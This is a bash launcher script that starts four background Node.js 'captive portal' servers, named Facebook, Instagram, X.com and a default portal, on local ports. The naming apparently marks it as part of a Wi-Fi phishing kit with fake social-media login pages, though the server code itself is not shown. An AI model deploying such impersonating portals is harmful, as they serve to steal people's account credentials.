#!/bin/bash

# This script starts all three servers (Facebook, Instagram, X) in the background.

# Set color variables
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}Starting all captive portal servers...${NC}"

# Function to start a server
start_server() {
  DIR=$1
  PORT=$2
  NAME=$3

  echo -e "\n-> Starting ${GREEN}${NAME}${NC} server..."
  if [ -d "$DIR" ]; then
    cd "$DIR"
    if [ -f "server.js" ]; then
      # Use nohup to run in the background and save logs
      nohup node server.js > server.log 2>&1 &
      echo -e "   Server for ${GREEN}${NAME}${NC} is running on ${YELLOW}http://localhost:${PORT}${NC}"
      echo -e "   Logs are being saved to ${DIR}/server.log"
    else
      echo "   server.js not found in ${DIR}, skipping."
    fi
    cd ..
  else
    echo "   Directory ${DIR} not found, skipping."
  fi
}

# Start all servers
start_server "facebook" 3000 "Facebook"
start_server "instagram" 3001 "Instagram"
start_server "x" 3002 "X.com"
start_server "default-captive" 3003 "Default Captive"

echo -e "\n${GREEN}✅ All servers have been started in the background.${NC}"
echo "To stop all servers, you can run the command: ${YELLOW}killall node${NC}"
